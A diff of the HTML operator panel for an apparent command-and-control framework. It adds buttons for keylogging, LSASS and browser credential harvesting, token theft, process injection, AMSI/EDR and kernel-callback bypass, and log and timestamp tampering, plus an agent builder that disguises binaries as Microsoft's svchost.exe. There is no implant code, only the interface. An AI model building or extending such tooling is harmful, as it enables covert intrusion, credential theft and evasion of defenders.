@@ -49,30 +49,60 @@
     <button id="tab-btn-dash" class="tab-btn active">Dashboard</button>
     <button id="tab-btn-shell" class="tab-btn">Shell</button>
     <button id="tab-btn-builder" class="tab-btn">Builder</button>
+    <button id="tab-btn-logs" class="tab-btn">Audit Log</button>
   </nav>
 
   <div id="tab-dash">
     <h2>Connected agents <span class="muted" id="agent-count"></span></h2>
     <table>
-      <thead><tr><th>Agent ID</th><th>Hostname / status</th><th>Peer</th><th>Last seen</th></tr></thead>
-      <tbody id="agents-tbody"><tr><td colspan="4" class="muted">No agents connected.</td></tr></tbody>
+      <thead><tr><th>Agent ID</th><th>Hostname / status</th><th>Peer</th><th>Last seen</th><th>OS</th></tr></thead>
+      <tbody id="agents-tbody"><tr><td colspan="5" class="muted">No agents connected.</td></tr></tbody>
     </table>
 
     <h2>Commands</h2>
-    <div class="row">
-      <label>Target Agent <select id="agent-select"></select></label>
+    <div class="row" style="align-items:center;gap:1rem;flex-wrap:wrap;">
+      <label>Target Agent <select id="agent-select" style="min-width:200px;"></select></label>
+      <span id="cmd-status" class="muted" style="font-size:0.85rem;"></span>
     </div>
 
-    <!-- ── Recon ───────────────────────────────────────────────── -->
+    <!-- ── Reconnaissance ──────────────────────────────────────── -->
     <div class="cmd-group">
       <h3>Reconnaissance</h3>
       <div class="cmd-grid">
         <button class="cmd-btn" data-cmd="Ping">Ping</button>
         <button class="cmd-btn" data-cmd="GetSystemInfo">System Info</button>
         <button class="cmd-btn" data-cmd="ListProcesses">List Processes</button>
-        <button class="cmd-btn" data-cmd="DiscoverNetwork">Discover Network</button>
         <button class="cmd-btn" data-cmd="ListDirectory">List Directory</button>
         <button class="cmd-btn" data-cmd="ReadFile">Read File</button>
+        <button class="cmd-btn" data-cmd="SandboxCheck">Sandbox Check</button>
+      </div>
+    </div>
+
+    <!-- ── Network Discovery ───────────────────────────────────── -->
+    <div class="cmd-group">
+      <h3>Network Discovery</h3>
+      <div class="cmd-grid">
+        <button class="cmd-btn" data-cmd="NetArpScan">ARP Scan</button>
+        <button class="cmd-btn" data-cmd="NetPingSweep">Ping Sweep</button>
+        <button class="cmd-btn" data-cmd="NetTcpScan">TCP Port Scan</button>
+        <button class="cmd-btn" data-cmd="NetReverseDns">Reverse DNS</button>
+        <button class="cmd-btn" data-cmd="NetAdSrv">AD SRV Discovery</button>
+      </div>
+    </div>
+
+    <!-- ── Surveillance ────────────────────────────────────────── -->
+    <div class="cmd-group">
+      <h3>Surveillance</h3>
+      <div class="cmd-grid">
+        <button class="cmd-btn" data-cmd="CaptureScreen">Screen Capture (legacy)</button>
+        <button class="cmd-btn" data-cmd="Screenshot">Screenshot (monitor)</button>
+        <button class="cmd-btn" data-cmd="KeyloggerStart">Keylogger Start</button>
+        <button class="cmd-btn" data-cmd="KeyloggerDump">Keylogger Dump</button>
+        <button class="cmd-btn" data-cmd="KeyloggerStop">Keylogger Stop</button>
+        <button class="cmd-btn" data-cmd="ClipboardGet">Clipboard Get</button>
+        <button class="cmd-btn" data-cmd="ClipboardMonitorStart">Clipboard Monitor Start</button>
+        <button class="cmd-btn" data-cmd="ClipboardMonitorDump">Clipboard Monitor Dump</button>
+        <button class="cmd-btn" data-cmd="ClipboardMonitorStop">Clipboard Monitor Stop</button>
       </div>
     </div>
 
@@ -80,7 +110,6 @@
     <div class="cmd-group">
       <h3>Remote Assist</h3>
       <div class="cmd-grid">
-        <button class="cmd-btn" data-cmd="CaptureScreen">Capture Screen</button>
         <button class="cmd-btn" data-cmd="SimulateKey">Simulate Key</button>
         <button class="cmd-btn" data-cmd="SimulateMouse">Simulate Mouse</button>
       </div>
@@ -101,6 +130,18 @@
       <h3>File Operations</h3>
       <div class="cmd-grid">
         <button class="cmd-btn" data-cmd="WriteFile">Write File</button>
+      </div>
+    </div>
+
+    <!-- ── Credential Harvesting ───────────────────────────────── -->
+    <div class="cmd-group">
+      <h3>Credential Harvesting <small class="muted">(Windows)</small></h3>
+      <div class="cmd-grid">
+        <button class="cmd-btn" data-cmd="HarvestLSASS">Harvest LSASS</button>
+        <button class="cmd-btn" data-cmd="HarvestLSA">Harvest LSA</button>
+        <button class="cmd-btn" data-cmd="LSAWhispererStatus">LSA Whisperer Status</button>
+        <button class="cmd-btn" data-cmd="LSAWhispererStop">LSA Whisperer Stop</button>
+        <button class="cmd-btn" data-cmd="BrowserData">Browser Data</button>
       </div>
     </div>
 
@@ -126,12 +167,85 @@
       </div>
     </div>
 
-    <!-- ── Evasion / Morphing ──────────────────────────────────── -->
+    <!-- ── Token Manipulation ──────────────────────────────────── -->
     <div class="cmd-group">
-      <h3>Evasion &amp; Morphing</h3>
+      <h3>Token Manipulation <small class="muted">(Windows)</small></h3>
       <div class="cmd-grid">
+        <button class="cmd-btn" data-cmd="MakeToken">Make Token</button>
+        <button class="cmd-btn" data-cmd="StealToken">Steal Token</button>
+        <button class="cmd-btn" data-cmd="Rev2Self">Rev2Self</button>
+        <button class="cmd-btn" data-cmd="GetSystem">Get System</button>
+        <button class="cmd-btn" data-cmd="ImpersonatePipe">Impersonate Pipe</button>
+        <button class="cmd-btn" data-cmd="RevertToken">Revert Token</button>
+        <button class="cmd-btn" data-cmd="ListTokens">List Tokens</button>
+      </div>
+    </div>
+
+    <!-- ── Injection Engine ────────────────────────────────────── -->
+    <div class="cmd-group">
+      <h3>Injection Engine <small class="muted">(Windows)</small></h3>
+      <div class="cmd-grid">
+        <button class="cmd-btn" data-cmd="UnifiedInject">Unified Inject</button>
+        <button class="cmd-btn" data-cmd="TransactedHollow">Transacted Hollow</button>
+        <button class="cmd-btn" data-cmd="DelayedStomp">Delayed Module Stomp</button>
+        <button class="cmd-btn" data-cmd="InjectSideLoad">Side-Load Inject</button>
+        <button class="cmd-btn" data-cmd="ExecuteAssembly">Execute Assembly (.NET)</button>
+        <button class="cmd-btn" data-cmd="ExecuteBOF">Execute BOF (COFF)</button>
+      </div>
+    </div>
+
+    <!-- ── P2P Mesh Management ─────────────────────────────────── -->
+    <div class="cmd-group">
+      <h3>P2P Mesh</h3>
+      <div class="cmd-grid">
+        <button class="cmd-btn" data-cmd="ListTopology">List Topology</button>
+        <button class="cmd-btn" data-cmd="ListLinks">List Links</button>
+        <button class="cmd-btn" data-cmd="LinkAgents">Link Agents</button>
+        <button class="cmd-btn" data-cmd="UnlinkAgent">Unlink Agent</button>
+        <button class="cmd-btn" data-cmd="LinkTo">Link To Parent</button>
+        <button class="cmd-btn" data-cmd="Unlink">Unlink (self)</button>
+        <button class="cmd-btn" data-cmd="MeshConnect">Mesh Connect</button>
+        <button class="cmd-btn" data-cmd="MeshDisconnect">Mesh Disconnect</button>
+        <button class="cmd-btn" data-cmd="MeshQuarantine">Quarantine Peer</button>
+        <button class="cmd-btn" data-cmd="MeshClearQuarantine">Clear Quarantine</button>
+        <button class="cmd-btn" data-cmd="MeshSetCompartment">Set Compartment</button>
+        <button class="cmd-btn cmd-btn-danger" data-cmd="MeshKillSwitch">Mesh Kill Switch</button>
+      </div>
+    </div>
+
+    <!-- ── Advanced Evasion ────────────────────────────────────── -->
+    <div class="cmd-group">
+      <h3>Advanced Evasion <small class="muted">(Windows)</small></h3>
+      <div class="cmd-grid">
+        <button class="cmd-btn" data-cmd="SetSleepVariant">Set Sleep Variant</button>
         <button class="cmd-btn" data-cmd="SetReencodeSeed">Set Re-encode Seed</button>
         <button class="cmd-btn" data-cmd="MorphNow">Morph Now</button>
+        <button class="cmd-btn" data-cmd="UnhookNtdll">Unhook NtDLL</button>
+        <button class="cmd-btn" data-cmd="AmsiBypassMode">AMSI Bypass Mode</button>
+        <button class="cmd-btn" data-cmd="EvanescoStatus">Evanesco Status</button>
+        <button class="cmd-btn" data-cmd="EvanescoSetThreshold">Evanesco Threshold</button>
+        <button class="cmd-btn" data-cmd="CetStatus">CET Status</button>
+        <button class="cmd-btn" data-cmd="SyscallEmulationToggle">Syscall Emulation</button>
+        <button class="cmd-btn" data-cmd="EvasionTransformScan">EDR Transform Scan</button>
+        <button class="cmd-btn" data-cmd="EvasionTransformRun">EDR Transform Run</button>
+        <button class="cmd-btn" data-cmd="EdrBypassStatus">EDR Bypass Status</button>
+        <button class="cmd-btn" data-cmd="KernelCallbackScan">Kernel CB Scan</button>
+        <button class="cmd-btn" data-cmd="KernelCallbackNuke">Kernel CB Nuke</button>
+        <button class="cmd-btn" data-cmd="KernelCallbackRestore">Kernel CB Restore</button>
+      </div>
+    </div>
+
+    <!-- ── Forensic Cleanup ────────────────────────────────────── -->
+    <div class="cmd-group">
+      <h3>Forensic Cleanup <small class="muted">(Windows)</small></h3>
+      <div class="cmd-grid">
+        <button class="cmd-btn" data-cmd="CleanPrefetch">Clean Prefetch</button>
+        <button class="cmd-btn" data-cmd="DisablePrefetch">Disable Prefetch</button>
+        <button class="cmd-btn" data-cmd="RestorePrefetch">Restore Prefetch</button>
+        <button class="cmd-btn" data-cmd="Timestomp">Timestomp File</button>
+        <button class="cmd-btn" data-cmd="TimestompDirectory">Timestomp Directory</button>
+        <button class="cmd-btn" data-cmd="CleanUsn">Clean USN Journal</button>
+        <button class="cmd-btn" data-cmd="SyncTimestamps">Sync Timestamps</button>
       </div>
     </div>
 
@@ -141,17 +255,6 @@
       <div class="cmd-grid">
         <button class="cmd-btn" data-cmd="EnablePersistence">Enable Persistence</button>
         <button class="cmd-btn" data-cmd="DisablePersistence">Disable Persistence</button>
-      </div>
-    </div>
-
-    <!-- ── Token Manipulation ──────────────────────────────────── -->
-    <div class="cmd-group">
-      <h3>Token Manipulation <small class="muted">(Windows)</small></h3>
-      <div class="cmd-grid">
-        <button class="cmd-btn" data-cmd="MakeToken">Make Token</button>
-        <button class="cmd-btn" data-cmd="StealToken">Steal Token</button>
-        <button class="cmd-btn" data-cmd="Rev2Self">Rev2Self</button>
-        <button class="cmd-btn" data-cmd="GetSystem">Get System</button>
       </div>
     </div>
 
@@ -179,9 +282,17 @@
 
     <h3 style="margin-top:1rem;">Last result</h3>
     <pre id="result" class="muted">—</pre>
+  </div>
 
-    <h2>Audit stream</h2>
-    <pre id="audit"></pre>
+  <!-- ═══════════════════════════════ AUDIT LOG TAB ══════════════════════════ -->
+  <div id="tab-logs" hidden>
+    <h2>Audit Stream</h2>
+    <div class="row" style="gap:0.5rem;align-items:center;">
+      <button id="btn-clear-audit" class="modal-btn">Clear</button>
+      <input type="text" id="audit-filter" placeholder="Filter by agent/action..." style="flex:1;">
+      <span class="muted" id="audit-count" style="font-size:0.85rem;"></span>
+    </div>
+    <pre id="audit" style="max-height:70vh;overflow-y:auto;"></pre>
   </div>
 
   <div id="tab-shell" hidden>
@@ -197,85 +308,181 @@
 
   <div id="tab-builder" hidden>
     <h2>Agent Builder</h2>
-    <p class="muted">Configure and generate custom agent binaries.</p>
+    <p class="muted">Configure and generate custom agent binaries. All fields are validated server-side before the build is queued.</p>
 
-    <div style="display:grid;gap:1rem;max-width:600px;background:#8881;padding:1rem;border-radius:6px;">
+    <!-- ── Target Platform ─────────────────────────────────────── -->
+    <div class="builder-section">
+      <h3>Target Platform</h3>
       <div class="row">
-        <label style="flex:1">Target OS
+        <label style="flex:1">Operating System
           <select id="build-os" style="width:100%;margin-top:0.25rem;">
-            <option value="windows">Windows</option>
             <option value="linux" selected>Linux</option>
+            <option value="windows">Windows</option>
             <option value="macos">macOS</option>
           </select>
         </label>
-        <label style="flex:1">Target Architecture
+        <label style="flex:1">Architecture
           <select id="build-arch" style="width:100%;margin-top:0.25rem;">
             <option value="x86_64" selected>x86_64</option>
             <option value="aarch64">aarch64</option>
           </select>
         </label>
+        <label style="flex:1">Output Format
+          <select id="build-format" style="width:100%;margin-top:0.25rem;">
+            <option value="exe" selected>Executable (EXE / ELF)</option>
+            <option value="shellcode">Shellcode (PIC)</option>
+          </select>
+        </label>
       </div>
-
-      <div>
-        <strong>Features</strong>
-        <div class="row" style="gap:1rem;margin-top:0.5rem;">
-          <label><input type="checkbox" id="feat-persistence" checked> Persistence</label>
-          <label><input type="checkbox" id="feat-direct-syscalls"> Direct Syscalls</label>
-          <label><input type="checkbox" id="feat-remote-assist"> Remote Assist</label>
-          <label><input type="checkbox" id="feat-stealth"> Advanced Evasion Suite</label>
-        </div>
-        <small class="muted" style="display:block;margin-top:0.25rem;">
-          Direct Syscalls enables inline syscall stubs. Remote Assist enables screen capture and input simulation.
-          Advanced Evasion Suite enables the most robust detection-resistant behaviour (syscalls, OPSEC sleep, etc.).
-        </small>
-      </div>
-
-      <div>
-        <strong>Connection Details</strong>
-        <div class="row">
-          <label style="flex:2">Host / IP <input type="text" id="build-host" placeholder="orchestra.local" style="width:100%;margin-top:0.25rem;"></label>
-          <label style="flex:1">Port <input type="number" id="build-port" value="443" style="width:100%;margin-top:0.25rem;"></label>
-        </div>
-        <div class="row">
-          <label style="flex:1">TLS Certificate Fingerprint / CA Pin
-            <input type="text" id="build-pin" placeholder="sha256:..." style="width:100%;margin-top:0.25rem;">
-          </label>
-        </div>
-      </div>
-
-      <div>
-        <strong>Encryption / Signing Key</strong>
-        <div class="row">
-          <input type="text" id="build-key" placeholder="32-byte hex key..." style="flex:1;">
-          <button id="btn-gen-key">Generate Random</button>
-        </div>
-      </div>
-
-      <div>
-        <strong>Output Directory (Optional)</strong>
-        <div class="row">
-          <input type="text" id="build-output-dir" placeholder="/var/lib/orchestra/builds" style="flex:1;margin-top:0.25rem;">
-        </div>
-      </div>
-
-      <button id="btn-build" class="primary" style="font-weight:bold;margin-top:0.5rem;">Build Agent</button>
     </div>
 
-    <div style="margin-top:1.5rem;max-width:600px;background:#8881;padding:1rem;border-radius:6px;">
-      <strong>Profile Management (AES-256-GCM Encrypted)</strong>
+    <!-- ── C2 Connection ───────────────────────────────────────── -->
+    <div class="builder-section">
+      <h3>C2 Connection</h3>
+      <div class="row">
+        <label style="flex:2">C2 Host / IP
+          <input type="text" id="build-host" placeholder="c2.example.com" style="width:100%;margin-top:0.25rem;">
+        </label>
+        <label style="flex:1">Agent Port
+          <input type="number" id="build-port" value="8444" style="width:100%;margin-top:0.25rem;">
+        </label>
+        <label style="flex:1">Transport
+          <select id="build-transport" style="width:100%;margin-top:0.25rem;">
+            <option value="tls" selected>TLS (default)</option>
+            <option value="http">HTTP CDN Relay</option>
+            <option value="doh">DNS-over-HTTPS</option>
+            <option value="ssh">SSH Tunnel</option>
+            <option value="smb">SMB Named Pipe</option>
+          </select>
+        </label>
+      </div>
+      <div class="row">
+        <label style="flex:1">TLS Certificate Fingerprint (SHA-256, 64 hex chars)
+          <input type="text" id="build-pin" placeholder="9cf7a2d5..." style="width:100%;margin-top:0.25rem;">
+        </label>
+        <button id="btn-fetch-pin" style="align-self:flex-end;" title="Fetch fingerprint from this server">Fetch from Server</button>
+      </div>
+    </div>
+
+    <!-- ── Encryption / Signing ────────────────────────────────── -->
+    <div class="builder-section">
+      <h3>Encryption &amp; Signing Key</h3>
+      <div class="row">
+        <input type="text" id="build-key" placeholder="Base64-encoded 32-byte key..." style="flex:1;">
+        <button id="btn-gen-key">Generate Random</button>
+      </div>
+      <small class="muted">Used to derive the agent's session key and HMAC. Must match server agent_shared_secret.</small>
+    </div>
+
+    <!-- ── Behavior ────────────────────────────────────────────── -->
+    <div class="builder-section">
+      <h3>Behavior &amp; Timing</h3>
+      <div class="row">
+        <label style="flex:1">Sleep Interval (ms)
+          <input type="number" id="build-sleep-ms" value="5000" min="100" style="width:100%;margin-top:0.25rem;">
+        </label>
+        <label style="flex:1">Jitter (%)
+          <input type="number" id="build-jitter" value="20" min="0" max="100" style="width:100%;margin-top:0.25rem;">
+        </label>
+        <label style="flex:1">Kill Date (optional)
+          <input type="date" id="build-kill-date" style="width:100%;margin-top:0.25rem;">
+        </label>
+      </div>
+      <div class="row">
+        <label style="flex:1">Reproducibility Seed (optional hex u64)
+          <input type="text" id="build-seed" placeholder="a1b2c3d4e5f6a7b8" style="width:100%;margin-top:0.25rem;">
+        </label>
+      </div>
+      <small class="muted">Sleep + jitter control beacon cadence. Kill date auto-shuts the agent. Seed pins binary entropy for reproducible builds.</small>
+    </div>
+
+    <!-- ── Features ────────────────────────────────────────────── -->
+    <div class="builder-section">
+      <h3>Feature Selection</h3>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:0.4rem 1.5rem;margin-top:0.5rem;">
+        <label><input type="checkbox" id="feat-persistence" checked> Persistence (systemd / task scheduler)</label>
+        <label><input type="checkbox" id="feat-direct-syscalls"> Direct Syscalls (inline stubs)</label>
+        <label><input type="checkbox" id="feat-remote-assist"> Remote Assist (screen / input)</label>
+        <label><input type="checkbox" id="feat-stealth"> Advanced Evasion Suite</label>
+        <label><input type="checkbox" id="feat-network-discovery"> Network Discovery</label>
+        <label><input type="checkbox" id="feat-forensic-cleanup"> Forensic Cleanup</label>
+        <label><input type="checkbox" id="feat-self-reencode"> Self Re-encode (.text morphing)</label>
+        <label><input type="checkbox" id="feat-http-transport"> HTTP CDN Transport</label>
+        <label><input type="checkbox" id="feat-doh-transport"> DNS-over-HTTPS Transport</label>
+        <label><input type="checkbox" id="feat-ssh-transport"> SSH Transport</label>
+        <label><input type="checkbox" id="feat-smb-pipe-transport"> SMB Named Pipe Transport</label>
+        <label><input type="checkbox" id="feat-evasion-transform"> EDR Bypass Transform Engine</label>
+        <label><input type="checkbox" id="feat-p2p"> P2P Mesh Networking</label>
+        <label><input type="checkbox" id="feat-stack-spoof"> Stack Spoofing</label>
+      </div>
+    </div>
+
+    <!-- ── PE Artifact Kit ─────────────────────────────────────── -->
+    <div class="builder-section" id="artifact-kit-section">
+      <h3>PE Artifact Kit <small class="muted">(Windows only)</small></h3>
+      <div class="row">
+        <label style="flex:1">File Version (e.g. 1.0.0.0)
+          <input type="text" id="build-version" placeholder="1.0.0.0" style="width:100%;margin-top:0.25rem;">
+        </label>
+        <label style="flex:1">File Description
+          <input type="text" id="build-filedesc" placeholder="Windows Runtime" style="width:100%;margin-top:0.25rem;">
+        </label>
+      </div>
+      <div class="row">
+        <label style="flex:1">Company Name
+          <input type="text" id="build-company" placeholder="Microsoft Corporation" style="width:100%;margin-top:0.25rem;">
+        </label>
+        <label style="flex:1">Product Name
+          <input type="text" id="build-product" placeholder="Windows" style="width:100%;margin-top:0.25rem;">
+        </label>
+      </div>
+      <div class="row">
+        <label style="flex:1">Manifest Preset
+          <select id="build-manifest" style="width:100%;margin-top:0.25rem;">
+            <option value="">None</option>
+            <option value="service">Windows Service</option>
+            <option value="elevated">Elevated UAC</option>
+            <option value="standard">Standard User</option>
+          </select>
+        </label>
+        <label style="flex:1">Original Filename
+          <input type="text" id="build-origfilename" placeholder="svchost.exe" style="width:100%;margin-top:0.25rem;">
+        </label>
+      </div>
+      <small class="muted">Embedded in the PE VersionInfo resource to blend with legitimate system binaries.</small>
+    </div>
+
+    <!-- ── Output ──────────────────────────────────────────────── -->
+    <div class="builder-section">
+      <h3>Output</h3>
+      <div class="row">
+        <label style="flex:1">Server-side Output Directory (optional)
+          <input type="text" id="build-output-dir" placeholder="/var/lib/orchestra/builds" style="width:100%;margin-top:0.25rem;">
+        </label>
+      </div>
+    </div>
+
+    <button id="btn-build" class="primary" style="font-weight:bold;font-size:1rem;min-width:200px;">&#9654; Build Agent</button>
+
+    <!-- ── Profile Management ─────────────────────────────────── -->
+    <div class="builder-section" style="margin-top:1.5rem;">
+      <h3>Profile Management <small class="muted">(AES-256-GCM encrypted)</small></h3>
       <div class="row" style="margin-top:0.5rem;">
-        <input type="password" id="profile-passphrase" placeholder="Encryption Passphrase" style="flex:1;">
-        <button id="btn-export-profile">Export Profile</button>
+        <input type="password" id="profile-passphrase" placeholder="Encryption passphrase" style="flex:1;">
+        <button id="btn-export-profile">&#8659; Export Profile</button>
       </div>
       <div class="row" style="margin-top:0.5rem;">
         <input type="file" id="profile-file" accept=".json,.enc" style="flex:1;">
-        <button id="btn-import-profile">Import Profile</button>
+        <button id="btn-import-profile">&#8657; Import Profile</button>
       </div>
+      <small class="muted">All builder settings saved in AES-256-GCM encrypted JSON. Passphrase required for export/import.</small>
     </div>
-    <h3 style="margin-top:1.5rem;">Build Status</h3>
+
+    <!-- ── Build Log ───────────────────────────────────────────── -->
+    <h3 style="margin-top:1.5rem;">Build Log</h3>
     <pre id="build-log" class="muted">Waiting to build...</pre>
     <div id="build-download" style="margin-top:1rem;" hidden>
-      <a id="build-download-link" href="#" download class="ok" style="font-weight:bold;text-decoration:underline;">⬇ Download Binary</a>
+      <a id="build-download-link" href="#" download class="ok" style="font-weight:bold;text-decoration:underline;font-size:1.1rem;">&#11015; Download Binary</a>
     </div>
   </div>
 </section>
